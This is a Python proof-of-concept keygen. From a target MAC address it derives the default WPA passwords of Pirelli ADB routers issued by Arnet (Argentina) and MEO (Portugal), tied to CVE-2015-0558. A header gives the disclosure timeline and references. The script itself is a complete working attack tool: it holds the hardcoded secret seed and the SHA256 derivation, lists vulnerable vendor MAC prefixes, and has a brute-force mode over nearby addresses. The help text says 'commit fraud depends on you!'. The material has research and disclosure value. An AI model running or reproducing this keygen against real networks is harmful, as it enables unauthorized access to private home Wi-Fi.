#!/usr/bin/env python
# -*- coding: utf-8 -*-


'''
@license: GPLv3
@author : Eduardo Novella 
@contact: ednolo[a]inf.upv.es 
@twitter: @enovella_ 

-----------------
[*] Target      : 
-----------------
Vendor           : ADB broadband Pirelli
Router           : Model P.DG-A4001N
ISP              : Arnet Telecom Argentina, MEO Portugal
Possible-targets : http://hwaddress.com/?q=ADB%20Broadband%20Italia
Firmware         : (ARG) http://foro.seguridadwireless.net/puntos-de-acceso-routers-switchs-y-bridges/obtener-firmware-adb-p-dg-a4001n-%28arnet-telecom-argentina%29/   
                   (POR) https://bitbucket.org/dudux/routerfirmwares

-----------------
[*] References  : 
-----------------
[0] [AUSTRIA]   A1/Telekom Austria PRG EAV4202N Default WPA Key Algorithm Weakness    http://sviehb.wordpress.com/2011/12/04/prg-eav4202n-default-wpa-key-algorithm/
[1] [ITALY]     Alice AGPF: The algorithm!                                            http://wifiresearchers.wordpress.com/2010/06/02/alice-agpf-lalgoritmo/
[2] [ARGENTINA] CVE-2015-0558: Reverse-engineering the default WPA key generation     http://ednolo.alumnos.upv.es/?p=1883
                algorithm for Pirelli routers in Argentina
[3] [PORTUGAL]                                                                        http://ednolo.alumnos.upv.es/?p=2008


----------------------
[*] Test vectors ARG : 
----------------------
http://www.arg-wireless.com.ar/index.php?topic=1006.msg6551#msg6551

-----------------------
[*] Acknowledgements  : 
-----------------------
-> Thanks to fernando3k for giving me the firmware in order to do reverse-engineering on it , and christian32 for showing me a bunch of test vectors.
-> Thanks to Nicolás Chaves for spotting a problem between WLAN, LAN mac addresses.
-> Thanks to Kara Davis for working with me in Portugal Pirelli

-----------------
[*] Timeline    : 
-----------------
ARGENTINA
================
2014-09-11  Found the algorithm
2014-09-12  Send a message to @ArnetOnline via Twitter @enovella_
2014-09-15  Send a message via website, still looking for a simple mail (http://www.telecom.com.ar/hogares/contacto_tecnico.html)
2014-09-16  Send another message to Arnet via website. First reply via twitter where they redirect me to the website form.
2014-09-19  Direct message via twitter. I talk with them about the critical vulnerability and offer them an email with PGP key
2014-09-20  More twitter PM about the same. They do not want to be aware about the problem though.
2014-09-23  I assume that Arnet does not care about its clients' security at all regarding its little interest.
2014-09-24  I send the problem to the vendor ADB Pirelli via website form
2014-09-28  I send the problem to the vendor ADB Pirelli via email to Switzerland
2015-01-05  Full disclosure and CVE-2015-0558 assigned

PORTUGAL
================
2015-04-01  I receive an email confirming that the Portuguese ISP "MEO" uses the same algorithm  
2015-04-05  Send a message to @MEOpt via Twitter @enovella_
2015-04-05  I got response in matter of minutes \o/
2015-04-05  I send an email to luis-oliveira-cc@telecom.pt , stating the reference 3-78405621289 in email subject
2015-05-07  Full disclosure


-----------------
[*] Changelog   : 
-----------------
2015-05-06   v1.4         Added MEO routers in Portugal. Essid ADSLPT-ABXXXXX
2015-02-01   v1.3         Final version, hopefully
2015-01-12   v1.2         Confusion between LAN  and WLAN mac address
2015-01-10   v1.1         --allKeys flag added 
2014-09-11   v1.0         First PoC working

'''

import re
import sys
import hashlib
import argparse

VERSION     = 1
SUBVERSION  = 4
DATEVERSION = '2015-05-06' 
URL         = 'http://www.ednolo.alumnos.upv.es'

def genkey(mac,stdout='True'):
    seed = ('\x64\xC6\xDD\xE3\xE5\x79\xB6\xD9\x86\x96\x8D\x34\x45\xD2\x3B\x15' +
            '\xCA\xAF\x12\x84\x02\xAC\x56\x00\x05\xCE\x20\x75\x91\x3F\xDC\xE8')

    lookup  = '0123456789abcdefghijklmnopqrstuvwxyz'

    sha256 = hashlib.sha256()
    sha256.update(seed)
    sha256.update('1236790')
    sha256.update(mac)

    digest = bytearray(sha256.digest())

    if (stdout):
        print "[+] SHA256  : %s" % sha256.hexdigest()
        
    return ''.join([lookup[x % len(lookup)] for x in digest[0:10]])


def printTargets():
        print "[+] Possible vulnerable targets so far:"
        for t in targets:
            print ("\t bssid: {0:s}:XX:XX:XX \t essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX".format(t.upper()))

        sys.exit()

def checkTargets(bssid):
        supported = False
        for t in targets:
            if ( bssid.upper().startswith(t) ):
                supported = True
                break
        if (not supported):
            print "[!] Your bssid looks like not supported! Generating anyway."

def addIncToMac(mac_str, inc):
    try:
        mac = bytearray.fromhex('%012x' %(int(mac_str,16) + inc))
    except:
        sys.exit('[!] Use real input :)')
    return mac

def main():
    
    global targets
    version = " {0:d}.{1:d}  [{2:s}] ----> {3:s}".format(VERSION,SUBVERSION,DATEVERSION,URL) 
    targets = ['00:08:27','00:13:C8','00:17:C2','00:19:3E','00:1C:A2','00:1D:8B','00:22:33','00:8C:54',
    '30:39:F2','74:88:8B','84:26:15','A4:52:6F','A4:5D:A1','D0:D4:12','D4:D1:84','DC:0B:1A','F0:84:2F']
    
    parser = argparse.ArgumentParser(description='''>>> PoC WPA keygen for WiFi Networks deployed by Arnet in Argentina and
                                                 MEO in Portugal. So far only WiFi networks with essids like WiFi-Arnet-XXXX
                                                 or ADSLPT-ABXXXXX and manufactured by Pirelli are likely vulnerable. See 
                                                 http://ednolo.alumnos.upv.es/ for more details. Twitter: @enovella_  and   
                                                 email: ednolo[at]inf.upv.es. This software is used just as proof-of-concept,
                                                 commit fraud depends on you!   ''',
                                                 epilog='''(+) Help: python %s -b 74:88:8B:AD:C0:DE ''' %(sys.argv[0])
                                    )
   
    maingroup = parser.add_argument_group(title='required')
    maingroup.add_argument('-b','--bssid', type=str, nargs='?', help='Target mac address')
    parser.add_argument('-v', '--version', action='version', version='%(prog)s'+version)
    command_group = parser.add_mutually_exclusive_group()
    command_group.add_argument('-l','--list', help='List all vulnerable targets', action='store_true')
    command_group.add_argument('-a','--allkeys', help='Bruteforce mode', action="store_true")
    
    
    args = parser.parse_args()

    if args.list:
        printTargets()
    elif args.bssid:
        mac_str = re.sub(r'[^a-fA-F0-9]', '', args.bssid)
        if len(mac_str) != 12:
            sys.exit('[!] Check MAC format!\n')  
        try:
            
            checkTargets(args.bssid) 
            print '[+] MAC     : %s' % args.bssid

            if (args.allkeys):
                print '\n[+] WPA keys for SSID: WiFi-Arnet-XXXX (Argentina)'
                for i in xrange(-2,5):
                    mac = addIncToMac(mac_str,i)
                    print '%-10s' % ((genkey(mac, False)))

                
                print '\n[+] WPA keys for SSID: ADSLPT-ABXXXXX  (Portugal)'
                for i in xrange(-2,5):
                    mac = addIncToMac(mac_str,i)
                    print '%-10s' % ((genkey(mac, False)[:8]))
                    
            else:
                wpa = genkey((addIncToMac(mac_str,0)), False)
                print '[+] WPA key : %-10s\t%-10s' % (wpa,     "SSID: WiFi-Arnet-XXXX (Argentina)") 
                print '[+] WPA key : %-10s\t%-10s' % (wpa[:8], "SSID: ADSLPT-ABXXXXX  (Portugal)" ) 

        except:
            sys.exit('[!] Are you trying to crash me? :)')
    else:
	parser.print_help()

if __name__ == "__main__":
    main()
